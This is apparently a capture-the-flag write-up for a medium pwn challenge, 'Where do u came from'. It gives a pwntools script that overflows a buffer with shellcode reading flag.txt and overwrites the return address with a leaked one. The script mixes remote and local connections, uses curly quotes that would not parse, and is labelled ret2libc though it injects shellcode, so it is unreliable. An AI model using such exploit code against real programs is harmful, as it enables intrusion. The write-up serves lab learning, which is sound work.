---
layout: writeup

title: Where do u came from
difficulty: Medium
points: 500
categories: [Pwn]
tags: []

flag: Dynamic Flag
---

## Where do u came from

- **Category**: Pwn

- **Author**: Kirubahari

## Challenge Description

Ret2libc attack

## Solution

### Steps

Finding the right offset using `dbg` in cyclic mode which gives the correct offset

The return address is given the binary itself.

Combining that both helps in exploiting

### Tools Used

- gdb

- python

```python

#! /usr/bin/python3

from pwn import *

elf = remote(“IP“,port)

io = process()

io.recvuntil(": ")

addr = int(io.recv(14), 16)

shellcode = asm(shellcraft.cat("flag.txt"))

payload = shellcode + cyclic(136 - len(shellcode)) + p64(addr)

io.sendline(payload)

io.interactive()

```

### Flag

```

FLAG{ret2libc}

```
